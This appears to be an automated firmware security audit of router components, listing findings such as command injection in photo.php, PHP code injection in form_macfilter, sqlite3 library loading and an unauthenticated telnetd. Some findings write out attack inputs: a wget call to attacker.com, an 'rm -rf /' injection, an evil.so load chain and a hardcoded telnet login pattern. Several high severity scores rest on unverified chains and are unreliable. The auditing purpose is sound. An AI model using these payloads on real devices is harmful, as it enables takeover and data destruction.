{"name": "network_input-folder_view-create_folder", "file_path": "REDACTED_SENSITIVE_DATA", "location": "folder_view.php: create_folder()[HIDDEN]", "risk_score": 8.5, "confidence": 8.5, "description": "The user controls the directory name through the 'folder_name' input box, which is filtered by JavaScript and directly concatenated into the AddDir API. Trigger condition: constructing a dirname parameter containing '../' sequences; Constraint check: the frontend only filters \\/:*?\"<>| characters; Security impact: failing to validate path legitimacy may lead to path traversal attacks, overwriting system files or creating malicious directories.", "code_snippet": "para += \"&dirname=\" + REDACTED_SECRET_KEY_PLACEHOLDER_modify(folder_name);", "link_identifiers": ["create_folder", "folder_name", "AddDir", "dirname", "REDACTED_SECRET_KEY_PLACEHOLDER_modify", "/dws/api/"], "notes": "Need to verify the path normalization handling of `dirname` in `/dws/api/AddDir`; related backend file `/dws/api/AddDir.php`"}
{"name": "network_input-folder_view-upload_file", "file_path": "REDACTED_SENSITIVE_DATA", "location": "folder_view.php: upload_ajax()[HIDDEN]", "risk_score": 9.0, "confidence": 9.0, "description": "The file upload feature directly retrieves the filename provided by the user and only passes it after URI encoding. Trigger condition: uploading malicious files; Missing constraints: no extension filtering or path validation; Security impact: combined with backend vulnerabilities, may enable webshell upload or directory traversal.", "code_snippet": "fd.append(\"filename\", REDACTED_SECRET_KEY_PLACEHOLDER_modify(file_name));", "link_identifiers": ["upload_ajax", "upload_file", "UploadFile", "filename", "REDACTED_SECRET_KEY_PLACEHOLDER_modify", "/dws/api/"], "notes": "Analyze the file storage logic of /dws/api/UploadFile; Related keywords: arbitrary file upload"}
{"name": "network_input-folder_view-delete_file", "file_path": "REDACTED_SENSITIVE_DATA", "location": "folder_view.php: delete_file()[HIDDEN]", "risk_score": 7.5, "confidence": 8.0, "description": "The file deletion operation transmits the user-selected filename in JSON-encoded format. Trigger condition: manipulation of the filenames parameter; Missing constraint: absence of path validity verification; Security impact: potential deletion of critical system files via '../../' sequences.", "code_snippet": "para += \"&filenames=\" + REDACTED_SECRET_KEY_PLACEHOLDER_modify(encode_str);", "link_identifiers": ["delete_file", "filenames", "DelFile", "REDACTED_SECRET_KEY_PLACEHOLDER_modify", "/dws/api/"], "notes": "Verify the path checking mechanism of /dws/api/DelFile; Related keywords: path traversal"}
{"name": "info-folder_view-api_delegation", "file_path": "REDACTED_SENSITIVE_DATA", "location": "folder_view.php", "risk_score": 0.0, "confidence": 5.0, "description": "The frontend does not perform any direct dangerous operations; all file/directory operations are delegated to the /dws/api backend for processing. Security impact: Frontend parameter collection vulnerabilities require combination with backend implementation to form a complete attack chain.", "link_identifiers": ["/dws/api/", "ListFile", "AddDir", "UploadFile", "DelFile"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "pending_analysis-AddDir_path_traversal", "file_path": "REDACTED_SENSITIVE_DATA", "location": "[HIDDEN]: /dws/api/AddDir.php", "risk_score": 0.0, "confidence": 8.25, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["AddDir", "dirname", "[HIDDEN]", "/dws/api/", "create_folder"], "notes": "Directly linked to frontend discovery 'network_input-folder_view-create_folder'; requires checking path concatenation and filtering logic"}
{"name": "pending_analysis-UploadFile_arbitrary_upload", "file_path": "REDACTED_SENSITIVE_DATA", "location": "[HIDDEN]: /dws/api/UploadFile.php", "risk_score": 0.0, "confidence": 9.0, "description": "Unverified high-risk attack chain node: Analyze the handling of the 'filename' parameter in /dws/api/UploadFile.php. If file storage paths/extensions are unrestricted, combined with a frontend file upload vulnerability, webshell deployment becomes possible. Trigger condition: Malicious filenames transmitted from frontend to UploadFile API.", "link_identifiers": ["UploadFile", "filename", "[HIDDEN]", "/dws/api/", "upload_ajax"], "notes": "Directly related to the frontend discovery of 'network_input-folder_view-upload_file'; requires inspection of the file storage path validation mechanism"}
{"name": "pending_analysis-DelFile_path_traversal", "file_path": "REDACTED_SENSITIVE_DATA", "location": "[HIDDEN]: /dws/api/DelFile.php", "risk_score": 0.0, "confidence": 7.5, "description": "Unverified attack chain node: Check the path validation of the 'filenames' parameter in /dws/api/DelFile.php. If '../' sequences are not resolved, combined with frontend vulnerabilities, it could lead to system file deletion. Trigger condition: Malicious paths are passed to the DelFile API via frontend JSON encoding.", "link_identifiers": ["DelFile", "filenames", "[HIDDEN]", "/dws/api/", "delete_file"], "notes": "Directly linked to the frontend discovery of 'network_input-folder_view-delete_file'; requires validation of path resolution security."}
{"name": "network_input-sqlite3_load_extension-0xd0d0", "file_path": "bin/sqlite3", "location": "fcn.0000d0d0 @ 0xd0d0", "risk_score": 9.0, "confidence": 9.0, "description": ".load command arbitrary library loading vulnerability: Users can directly control the piVar12[-0x5e] parameter value through command-line arguments (e.g., '.load /tmp/evil.so'), which is then passed to sqlite3_load_extension() for execution. Due to the lack of path validation, attackers can achieve remote code execution by writing malicious .so files (e.g., via an upload vulnerability). Trigger conditions: 1) Attackers can control sqlite3 command-line arguments; 2) A writable directory exists (e.g., /tmp). Actual impact: CVSS 9.8 (RCE + privilege escalation). In scenarios where the firmware's web interface invokes sqlite3, this can directly form a complete attack chain.", "link_identifiers": ["sqlite3_load_extension", "load", "piVar12[-0x5e]", "param_1", "0x3a20"], "notes": "Verify whether components in the firmware that call sqlite3 (such as CGI scripts) directly pass user input to the .load parameter."}
{"name": "network_input-pragma_token_overflow-0xd0d0", "file_path": "bin/sqlite3", "location": "fcn.0000d0d0 @ 0xd0d0", "risk_score": 9.0, "confidence": 8.0, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["pragma", "piVar12[-1]", "REDACTED_SENSITIVE_DATA", "0xfffffe80", "fcn.0000d0d0"]}
{"name": "network_input-init_argument_path_traversal-0xe55c", "file_path": "bin/sqlite3", "location": "fcn.0000d0d0+0xe55c", "risk_score": 9.0, "confidence": 8.5, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "uVar4 = sym.imp.fopen64(piVar12[-0x5e], 0x3b04); // 'wb'[HIDDEN]", "link_identifiers": ["fopen64", "wb", "piVar12[-0x5e]", "param_1", "fcn.0000d0d0"]}
{"name": "network_input-sql_injection-0x10c08", "file_path": "bin/sqlite3", "location": "fcn.00010c08 @ 0x10c08", "risk_score": 8.0, "confidence": 8.0, "description": "SQL injection execution chain: User input is directly embedded into the SQL statement buffer (ppcVar7[-1]) via fgets/stdin or command line, then concatenated through memcpy and directly reaches sqlite3_prepare_v2. No input filtering or parameterized processing exists. Trigger condition: Firmware components (e.g., web backend) directly concatenate user input to generate SQL commands. Actual impact: CVSS 8.8 (data leakage/tampering), potentially escalating to RCE when SQLite extensions are enabled.", "link_identifiers": ["sqlite3_prepare_v2", "ppcVar7[-1]", "memcpy", "fcn.0000c214", "param_2"]}
{"name": "memory_management-double_free-0x10c6c", "file_path": "bin/sqlite3", "location": "fcn.00010c08 @ 0x10c6c", "risk_score": 8.5, "confidence": 7.75, "description": "Double-free vulnerability (fcn.00010c08): When memory allocation fails in fcn.00009c14, the same pointer is freed twice at 0x10c6c and function end. Trigger condition: Exhaust memory by controlling param_2. Actual impact: CVSS 8.2 (DoS/potential RCE), stably reproducible in firmware components frequently calling sqlite3.", "link_identifiers": ["fcn.00010c08", "sym.imp.free", "fcn.00009c14", "param_2", "0x1dcd8"]}
{"name": "exploit_chain-cgibin_to_sqlite3_rce", "file_path": "bin/sqlite3", "location": "htdocs/cgibin:0x1e478 â†’ bin/sqlite3:fcn.0000d0d0", "risk_score": 10.0, "confidence": 9.5, "description": "Full attack chain: The attacker controls the QUERY_STRING parameter via HTTP requests to inject malicious commands, invokes /bin/sqlite3 with carefully crafted parameters, and triggers either the .load arbitrary library loading or .pragma stack overflow vulnerability to achieve remote code execution. Trigger steps: 1) Send malicious HTTP request to htdocs/cgibin (e.g., `name=';sqlite3 test.db \".load /tmp/evil.so\";'`); 2) popen executes the concatenated command; 3) sqlite3 processes the malicious parameters to trigger the vulnerability. Success probability: CVSS 10.0 (complete system control), requiring: a) network input directly controlling command-line parameters b) writable /tmp directory c) no permission verification.", "link_identifiers": ["QUERY_STRING", "popen", "command_injection", "sqlite3_load_extension", "pragma", "piVar12[-0x5e]", "piVar12[-1]", "bin/sqlite3", "htdocs/cgibin"], "notes": "Forming an end-to-end attack chain: network interface â†’ command injection â†’ sqlite3 vulnerability trigger. RCE can be achieved without additional vulnerabilities, but write capability in the /tmp directory can enhance stability."}
{"name": "network_input-wireless_config-ssid_injection", "file_path": "htdocs/mydlink/form_wireless.php", "location": "htdocs/mydlink/form_wireless.php ([HIDDEN])", "risk_score": 8.0, "confidence": 8.25, "description": "SSID Injection and Buffer Overflow Risk: Attackers submit maliciously crafted f_ssid parameters (such as excessively long strings or specially formatted data) via HTTP POST, which are directly written to the 'wifi./ssid' NVRAM variable through the set() function without boundary checks. Trigger Condition: Sending a POST request containing a malicious ssid to form_wireless.php with settingsChanged=1. Potential Impact: If the underlying set() function has a buffer overflow vulnerability, it could lead to memory corruption; if the SSID is directly used by other services, it may cause configuration overwrites or stored XSS.", "code_snippet": "set($wifi.\"/ssid\", $ssid);", "link_identifiers": ["f_ssid", "set", "wifi./ssid", "settingsChanged", "form_wireless.php", "XNODE_getpathbytarget"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "network_input-wireless_config-wpa_plaintext", "file_path": "htdocs/mydlink/form_wireless.php", "location": "htdocs/mydlink/form_wireless.php", "risk_score": 8.0, "confidence": 9.0, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["f_wpa_psk", "set", "REDACTED_SENSITIVE_DATA", "check_key_type_and_valid", "isxdigit", "wpa_supplicant"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "network_input-wireless_config-nvram_injection", "file_path": "htdocs/mydlink/form_wireless.php", "location": "htdocs/mydlink/form_wireless.php", "risk_score": 7.0, "confidence": 8.25, "description": "NVRAM configuration injection path: All wireless configuration parameters (f_channel/f_radius_ip1, etc.) are directly written to NVRAM without validation. Trigger condition: Submit any valid POST parameter with settingsChanged=1. Potential impact: Enables man-in-the-middle attacks by overwriting critical configuration items (such as RADIUS server IP); if combined with XNODE abstraction layer vulnerabilities, may further escalate to system command execution.", "link_identifiers": ["f_channel", "f_radius_ip1", "set", "phy./media/channel", "XNODE_getpathbytarget", "settingsChanged"], "notes": "It is recommended to track the implementation of XNODE_getpathbytarget in the binary; related attack chain: HTTP â†’ malicious configuration injection â†’ wireless service restart â†’ man-in-the-middle attack."}
{"name": "network_input-http_relay-ContentLength_IntegerOverflow", "file_path": "mydlink/tsa", "location": "mydlink/tsa:fcn.00011c10:0x11b40-0x11b4c", "risk_score": 9.8, "confidence": 9.25, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["http_relay", "Content-Length", "memcpy", "atoi", "fcn.00011c10", "param_4", "*(param_4 + iVar1)=0", "8080"], "notes": "The starting point of the complete attack chain, which can be directly triggered via HTTP requests."}
{"name": "network_input-FormatString_Exploit", "file_path": "mydlink/tsa", "location": "mydlink/tsa:fcn.00010f48", "risk_score": 9.0, "confidence": 8.25, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["param_1", "param_1[0x32]", "uVar4", "snprintf", "0xc8", "0x4fb", "fcn.00010f48"], "notes": "The uVar4 variable and the 0x4fb offset are shared with the unverified memory write vulnerability, potentially forming a combined exploitation chain."}
{"name": "network_input-Unchecked_MemoryWrite", "file_path": "mydlink/tsa", "location": "mydlink/tsa:0x10f48 [fcn.00010f48]", "risk_score": 8.0, "confidence": 8.25, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["param_2", "uVar4", "parse_input", "/set_config", "HTTP_Request_Parser"], "notes": "The variable uVar4 and the 0x4fb offset are shared with the format string vulnerability, enabling combined exploitation."}
{"name": "file_access-htdocs/mydlink/form_admin-not_found", "file_path": "htdocs/mydlink/form_admin", "location": "htdocs/mydlink/form_admin:0 (file_not_found)", "risk_score": 0.0, "confidence": 5.0, "description": "The target file does not exist, preventing the analysis from proceeding. Specific manifestation: The requested analysis file 'htdocs/mydlink/form_admin' was not found in the firmware. Trigger condition: Attempting to access this file path. No actual security impact since the file's absence means no related exploit chain exists.", "code_snippet": "N/A (target file not found)", "link_identifiers": ["form_admin", "htdocs/mydlink"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "file-missing-form_wlan_acl", "file_path": "htdocs/mydlink/form_wlan_acl", "location": "/ ([HIDDEN])", "risk_score": 0.0, "confidence": 5.0, "description": "The target file 'htdocs/mydlink/form_wlan_acl' does not exist in the firmware, preventing analysis of HTTP parameter processing, input validation, etc. The trigger condition was an attempt to access this file path, but actual filesystem verification failed. Security impact: Unable to evaluate attack paths related to this file, potentially causing analysis interruption due to incomplete firmware or incorrect path.", "code_snippet": "[HIDDEN] - [HIDDEN]: find htdocs/mydlink -name form_wlan_acl", "link_identifiers": ["form_wlan_acl", "htdocs/mydlink"], "notes": "User confirmation required: 1) Whether firmware extraction is complete 2) Whether files are located in other directories such as 'www' or 'cgi-bin'. It is recommended to first verify the integrity of the firmware file system before proceeding with further analysis."}
{"name": "network_input-REDACTED_PASSWORD_PLACEHOLDER-REDACTED_PASSWORD_PLACEHOLDER_exposure", "file_path": "REDACTED_PASSWORD_PLACEHOLDER_PASSWORD_PLACEHOLDER", "location": "REDACTED_PASSWORD_PLACEHOLDER_PASSWORD_PLACEHOLDER ([HIDDEN])", "risk_score": 8.0, "confidence": 9.5, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "<REDACTED_PASSWORD_PLACEHOLDER><?if($REDACTED_PASSWORD_PLACEHOLDER==1){echo $REDACTED_PASSWORD_PLACEHOLDER;}?></REDACTED_PASSWORD_PLACEHOLDER>", "link_identifiers": ["REDACTED_PASSWORD_PLACEHOLDER", "$_GET", "REDACTED_PASSWORD_PLACEHOLDER", "REDACTED_PASSWORD_PLACEHOLDER", "REDACTED_PASSWORD_PLACEHOLDER"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "network_input-form_macfilter-remote_code_execution", "file_path": "htdocs/mydlink/form_macfilter", "location": "htdocs/mydlink/form_macfilter ([HIDDEN])", "risk_score": 10.0, "confidence": 8.75, "description": "Unverified remote code execution vulnerability. Attack chain: HTTP request contains settingsChanged=1 parameter â†’ malicious pollution of POST parameters like entry_enable_X/mac_hostname_ â†’ parameters directly written to /tmp/form_macfilter.php temporary file â†’ file content executed via dophp('load'). Trigger condition: Attacker submits POST request containing malicious PHP code (e.g.: entry_enable_1=';system(\"wget http://attacker.com/shell\");$a='). Constraints: Only basic MAC address validation (get_valid_mac), no filtering for other parameters. Security impact: Arbitrary command execution with web privileges, complete device compromise.", "code_snippet": "fwrite(\"a\", $tmp_file, \"$enable = $_POST[\\\"entry_enable_\\\".$i.\\\"];\\n\");\ndophp(\"load\",$tmp_file);", "link_identifiers": ["dophp", "fwrite", "$_POST", "$tmp_file", "entry_enable_", "mac_hostname_", "/tmp/form_macfilter.php", "settingsChanged"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "network_input-form_macfilter-nvram_tampering", "file_path": "htdocs/mydlink/form_macfilter", "location": "htdocs/mydlink/form_macfilter ([HIDDEN])", "risk_score": 8.0, "confidence": 7.75, "description": "NVRAM configuration tampering vulnerability. Attack chain: Polluting $_POST[macFltMode]/entry_enable_ parameters â†’ Directly manipulating NVRAM path (/acl/macctrl) via set()/query() functions. Trigger condition: Submitting a form containing settingsChanged=1. Constraints: No boundary validation for policy mode (macFltMode) and enable status (enable) parameters. Security impact: Tampering with network access control policies leading to privilege escalation or denial of service. Exploitation method: Setting macFltMode to abnormal values (e.g., 3) to disrupt access control logic.", "code_snippet": "set($entry_p.\"/enable\",$enable);\nset($macfp.\"/policy\",$mac_filter_policy);", "link_identifiers": ["set", "query", "del", "$macfp", "$_POST[\"macFltMode\"]", "$_POST[\"entry_enable_\"]", "/acl/macctrl", "mac_filter_policy"], "notes": "Verification required: 1) Secure implementation of set/query functions in xnode.php 2) NVRAM configuration errors may cause permanent device failure. Related file: xnode.php"}
{"name": "command_execution-udevd-init", "file_path": "etc/init.d/S15udevd.sh", "location": "etc/init.d/S15udevd.sh", "risk_score": 6.0, "confidence": 6.0, "description": "The startup script executes with REDACTED_PASSWORD_PLACEHOLDER privileges during the system initialization phase, with core operations including: 1) Mounting tmpfs to the /dev directory 2) Creating and mounting devpts 3) Launching the udevd daemon. The trigger condition is the system boot process, with no direct external input points. The primary security risk lies in the udevd daemon's handling of device events from the kernel (such as USB hot-plugging). If the rules in /etc/udev/rules.d/ are improperly configured, it could form an attack chain of 'physical device insertion â†’ triggering malicious command execution'.", "code_snippet": "udevd --daemon\nudevstart", "link_identifiers": ["udevd", "udevstart", "/dev", "mount", "tmpfs", "devpts"], "notes": "Requires further in-depth analysis: 1) Contents of the /etc/udev/rules.d/ rule files 2) Data flow verification mechanism of udevd for handling device events 3) Specific execution logic of udevstart. The current script is the initialization phase of the attack chain rather than a direct exploitation point. Correlation analysis target: /etc/udev/rules.d/"}
{"name": "command_injection-photo.php-ip_param", "file_path": "REDACTED_SENSITIVE_DATA", "location": "webaccess/photo.php:49", "risk_score": 9.5, "confidence": 9.4, "description": "High-risk command injection vulnerability: Attackers can inject arbitrary commands through the 'ip' GET parameter in photo.php. Specific manifestations: 1) Unfiltered $_GET['ip'] is directly concatenated into the ping command executed by system(). 2) Attackers can inject malicious commands (e.g., `ip=127.0.0.1;rm+-rf+/`) using separators like ;, &&, etc. 3) No input filtering or boundary checks are implemented. Trigger condition: Accessing the URL `photo.php?ip=[malicious_command]`. Successful exploitation can lead to remote code execution (RCE), granting complete control of the device.", "code_snippet": "$cmd = \"ping -c 1 \".$_GET['ip'];\nsystem($cmd);", "link_identifiers": ["system", "$_GET", "ip", "cmd", "ping"], "notes": "Verify whether the endpoint is open (e.g., via firmware routing configuration). Recommendations: 1) Check firmware firewall rules 2) Analyze other $_GET parameter processing points."}
{"name": "negative_finding-image_processing-webaccess_dir", "file_path": "REDACTED_SENSITIVE_DATA", "location": "webaccess/", "risk_score": 0.0, "confidence": 4.5, "description": "No image processing vulnerabilities detected: A comprehensive search (keyword matching + dangerous function scanning) within the webaccess directory revealed: 1) No thumbnail generation functionality 2) No image processing-related command calls (e.g., convert/resize) 3) No other image path parameter injection points found. This indicates no existing image processing chain vulnerabilities in the current directory.", "link_identifiers": ["thumbnail", "resize", "convert", "GetFile", "xml_request.json_cgi"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "network_input-event_handler-wan_event_registration", "file_path": "etc/init0.d/S41autowan.sh", "location": "etc/init0.d/S41autowan.sh:3-6", "risk_score": 6.0, "confidence": 8.25, "description": "The startup script registers three network event handlers when the parameter is 'start': 1) The WAN.DETECT event is bound to WAN-DETECT.sh; 2) The PPP.DISCOVER event is bound to WAN_ppp_dis.sh; 3) The DHCP.DISCOVER event is bound to WAN_dhcp_dis.sh. These event handlers serve as network input entry points and may receive untrusted data (such as maliciously crafted DHCP/PPP packets). The script itself only performs basic parameter checks (the 'start' condition judgment) without directly processing input data, but the exposed handler paths constitute potential starting points of an attack chain.", "code_snippet": "if [ \"$1\" = \"start\" ]; then\nevent WAN.DETECT add \"/etc/events/WAN-DETECT.sh WAN-1\"\nevent PPP.DISCOVER add \"sh /etc/events/WAN_ppp_dis.sh WAN-1 START\"\nevent DHCP.DISCOVER add \"sh /etc/events/WAN_dhcp_dis.sh WAN-1\"\nfi", "link_identifiers": ["event", "WAN.DETECT", "PPP.DISCOVER", "DHCP.DISCOVER", "/etc/events/WAN-DETECT.sh", "/etc/events/WAN_ppp_dis.sh", "/etc/events/WAN_dhcp_dis.sh", "WAN-1"], "notes": "Immediate analysis is required for three event handling scripts: 1) WAN-DETECT.sh handles WAN detection events; 2) WAN_ppp_dis.sh processes PPP discovery events; 3) WAN_dhcp_dis.sh manages DHCP discovery events. These scripts directly process network input and may contain command injection or buffer overflow vulnerabilities."}
{"name": "wps_sync-autoconfig-5g", "file_path": "htdocs/mydlink/form_wireless_5g", "location": "form_wireless_5g:7-14", "risk_score": 2.0, "confidence": 8.0, "description": "PHP script implements automatic WPS configuration synchronization from WLAN2 to WLAN1. Trigger condition: automatically executes when the script runs, with no external input interface. Boundary check: directly operates configuration nodes without input validation. Security impact: if attackers modify the $wifi1/$phy1 nodes through other vulnerabilities (e.g., path injection), it may cause abnormal WPS configuration, but there is no direct exploitation chain. Associated attack path: combined with the SSID injection vulnerability in form_wireless.php, it could contaminate the $wifi node, forming a configuration tampering chain.", "link_identifiers": ["XNODE_getpathbytarget", "query", "set", "$WLAN2", "$WLAN1", "$wps_enable", "$phy1", "$wifi1", "$phy2", "$wifi2"], "notes": "Cross-file correlation: 1) The SSID injection vulnerability in form_wireless.php (risk_level=8.0) can contaminate the $wifi node 2) XNODE_getpathbytarget is used in multiple high-risk scenarios 3) Need to verify whether the $phy1 node is affected by other input points"}
{"name": "script-usbmount-init", "file_path": "etc/init.d/S21usbmount.sh", "location": "S21usbmount.sh:1-2", "risk_score": 0.0, "confidence": 5.0, "description": "The S21usbmount.sh script only creates the fixed directory /var/tmp/storage: 1) It has no external input processing interface and is unaffected by any untrusted inputs; 2) It performs no command execution or path concatenation operations, making boundary checks inapplicable; 3) It has zero security impact, as attackers cannot trigger any dangerous operations through this script.", "code_snippet": "#!/bin/sh\nmkdir -p /var/tmp/storage", "link_identifiers": ["/var/tmp/storage", "mkdir"], "notes": "The script is a safe and harmless initialization operation. It is recommended to shift focus to analyzing other USB handling components (such as hotplug or udev rules), which may contain the actual USB input processing logic."}
{"name": "system_initialization-S10init-no_external_input", "file_path": "etc/init.d/S10init.sh", "location": "S10init.sh:1-7", "risk_score": 0.0, "confidence": 5.0, "description": "The S10init.sh script performs basic system initialization operations (mounting filesystems, setting kernel parameters), with all operations using hardcoded parameters and not processing any external input sources (such as NVRAM, environment variables, network data, etc.). Since the script does not accept any user-controllable input, there are no missing input validation or boundary check issues, and it cannot serve as a trigger point for attack paths.", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["mount", "echo", "REDACTED_SENSITIVE_DATA", "/proc/sys/vm/panic_on_oom"], "notes": "Consider analyzing other service startup scripts (such as network service scripts in /etc/init.d/) to identify potential attack vectors."}
{"name": "command_execution-autodetect_event", "file_path": "etc/init0.d/S41autowanv6.sh", "location": "etc/init0.d/S41autowanv6.sh:3-8", "risk_score": 6.0, "confidence": 6.75, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["event AUTODETECT", "REDACTED_SENSITIVE_DATA", "event AUTODETECT.REVERT", "REDACTED_SENSITIVE_DATA", "$1"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "command-injection-watch-dog-path", "file_path": "mydlink/mydlink-watch-dog.sh", "location": "mydlink-watch-dog.sh:30,32", "risk_score": 9.0, "confidence": 8.25, "description": "The script receives the process name via the $1 parameter, which is directly used for path concatenation and execution without validation (line 30: /mydlink/$1, line 32: /opt/$1). Attackers can inject malicious commands (e.g., ';reboot;') or path traversal characters (e.g., '../../bin/sh'). Trigger conditions: 1) Passing a malicious $1 value when invoking the script; 2) The target process is not detected by ps (line 25 condition). Actual impact: Full device control (if $1 is externally controllable). Constraints: $1 must contain an executable filename, but this can be bypassed using semicolons.", "code_snippet": "/mydlink/$1 > /dev/null 2>&1 &\n/opt/$1 > /dev/null 2>&1 &", "link_identifiers": ["$1", "/mydlink/$1", "/opt/$1", "pid", "grep", "ps"], "notes": "Track the source of $1: Check the components in /bin and /sbin that call this script to confirm whether the parameters originate from network input/NVRAM."}
{"name": "command-injection-watch-dog-kill", "file_path": "mydlink/mydlink-watch-dog.sh", "location": "mydlink-watch-dog.sh:28", "risk_score": 6.5, "confidence": 7.0, "description": "The unvalidated $1 parameter is used in the killall -9 command (line 28). Attackers can inject process names to mistakenly terminate critical services or exploit command injection vulnerabilities (dependent on shell parsing). Trigger condition: activated when the target process is not detected by ps. Although lower risk than direct command execution, it may compromise system stability.", "code_snippet": "killall -9 $1", "link_identifiers": ["killall", "$1", "pid"]}
{"name": "dos-watch-dog-reboot", "file_path": "mydlink/mydlink-watch-dog.sh", "location": "mydlink-watch-dog.sh:35,37", "risk_score": 7.0, "confidence": 7.75, "description": "Repeatedly triggering process crashes (more than 6 times) can cause the system to reboot (line 37). An attacker can crash the monitored process (e.g., by sending malformed packets) to trigger a denial of service. Trigger condition: restart_cnt>6 (line 35). Actual impact: continuous device rebooting.", "code_snippet": "if [ \"$restart_cnt\" -gt 6 ]; then\n    reboot\nfi", "link_identifiers": ["reboot", "restart_cnt"], "notes": "Analyze whether the vulnerabilities of monitored processes (such as device agents) are prone to being remotely triggered to crash."}
{"name": "static_script-module_loader-S12ubs_storage", "file_path": "etc/init.d/S12ubs_storage.sh", "location": "etc/init.d/S12ubs_storage.sh", "risk_score": 0.0, "confidence": 5.0, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "#!/bin/sh\n\ninsmod /lib/modules/usb-storage.ko\ninsmod /lib/modules/jnl.ko\ninsmod /lib/modules/ufsd.ko", "link_identifiers": ["insmod", "usb-storage.ko", "jnl.ko", "ufsd.ko"], "notes": "Note that kernel modules may contain vulnerabilities (such as driver vulnerabilities). It is recommended to subsequently analyze specific module files under /lib/modules/."}
{"name": "network_input-form_apply-unauth_reboot", "file_path": "htdocs/mydlink/form_apply", "location": "htdocs/form_apply:16", "risk_score": 8.0, "confidence": 8.25, "description": "Unauthorized device reboot vulnerability exists: An attacker can trigger the event('REBOOT') operation by sending a specially crafted POST request (setting settingsChanged=1 and Sta_reboot=1). The script lacks input validation or permission checks, allowing untrusted input to directly control critical operations. Trigger conditions are: 1) Attacker accesses the form_apply endpoint; 2) Sends a malicious POST request. The actual security impact is a denial-of-service attack (forced device reboot), with a simple and reliable exploitation method.", "code_snippet": "if($Sta_reboot==1){\n\tevent(\"DBSAVE\");\n\tevent(\"REBOOT\");\n}", "link_identifiers": ["$_POST", "settingsChanged", "Sta_reboot", "event", "REBOOT", "DBSAVE"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "env_get-telnetd-unauthenticated_start", "file_path": "etc/init0.d/S80telnetd.sh", "location": "etc/init0.d/S80telnetd.sh", "risk_score": 9.0, "confidence": 8.5, "description": "When the environment variable entn=1 and the script is started with the start parameter, the unauthenticated telnetd service is launched (-i br0). This is triggered if the ALWAYS_TN value obtained via the devdata tool is tampered with and set to 1. Attackers can directly gain shell access to the system through the br0 interface without any authentication mechanism. Missing boundary checks: No validation of the entn source or permission controls are implemented.", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["entn", "ALWAYS_TN", "devdata", "telnetd", "br0"], "notes": "Verify whether devdata is affected by external inputs such as NVRAM/environment variables."}
{"name": "file_read-telnetd-hardcoded_credential", "file_path": "etc/init0.d/S80telnetd.sh", "location": "etc/init0.d/S80telnetd.sh", "risk_score": 8.5, "confidence": 9.0, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "image_sign=`cat /etc/config/image_sign`\ntelnetd -l /usr/sbin/login -u Alphanetworks:$image_sign -i br0 &", "link_identifiers": ["image_sign", "/etc/config/image_sign", "Alphanetworks", "telnetd -l"], "notes": "It is recommended to check the file permissions and content generation mechanism of /etc/config/image_sign"}
{"name": "command_execution-telnetd-vulnerable_login", "file_path": "etc/init0.d/S80telnetd.sh", "location": "etc/init0.d/S80telnetd.sh", "risk_score": 7.0, "confidence": 7.5, "description": "Authentication relies on the external program /usr/sbin/login, which is triggered when the device configuration size (devconfsize) is 0. If the login program contains vulnerabilities such as buffer overflows, attackers can exploit them during the telnet login process. The xmldbc tool may affect the devconfsize value.", "code_snippet": "if [ -f \"/usr/sbin/login\" ]; then\n\ttelnetd -l /usr/sbin/login ...", "link_identifiers": ["/usr/sbin/login", "devconfsize", "xmldbc"], "notes": "Further analysis is required regarding the security of /usr/sbin/login and the assignment logic of devconfsize."}
{"name": "config-ipv6-kernel-params", "file_path": "etc/init.d/S16ipv6.sh", "location": "etc/init.d/S16ipv6.sh", "risk_score": 2.5, "confidence": 4.5, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["REDACTED_SENSITIVE_DATA", "REDACTED_SENSITIVE_DATA", "REDACTED_SENSITIVE_DATA", "ip6tables", "FORWARD", "DROP"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "command_execution-svchlper-service_param_injection", "file_path": "REDACTED_SENSITIVE_DATA", "location": "services/svchlper:7-9", "risk_score": 8.0, "confidence": 7.5, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "xmldbc -P /etc/services/$2.php -V START=/var/servd/$2_start.sh -V STOP=/var/servd/$2_stop.sh\nsh /var/servd/$2_start.sh > /dev/console", "link_identifiers": ["$2", "/etc/services/$2.php", "/var/servd/$2_start.sh", "/var/servd/$2_stop.sh", "xmldbc"], "notes": "Further tracking of the $2 parameter source (such as HTTP API or CLI input) is required, along with analyzing the processing logic of .php files in the /etc/services/ directory."}
{"name": "command_execution-svchlper-xmldbc_script_injection", "file_path": "REDACTED_SENSITIVE_DATA", "location": "services/svchlper:8-9", "risk_score": 7.5, "confidence": 6.25, "description": "The xmldbc command dynamically generates executable scripts. Improper handling of the $2.php file may lead to command injection. When $2 is tainted, arbitrary commands can be injected into the generated _start.sh script by manipulating the content of the .php file. Dangerous operations directly output to /dev/console may expose sensitive information.", "code_snippet": "xmldbc -P /etc/services/$2.php -V START=/var/servd/$2_start.sh\nsh /var/servd/$2_start.sh > /dev/console", "link_identifiers": ["xmldbc", "/var/servd/$2_start.sh", "sh", "/dev/console"], "notes": "It is essential to verify the security of the xmldbc tool and the input filtering mechanism of the /etc/services/*.php files."}
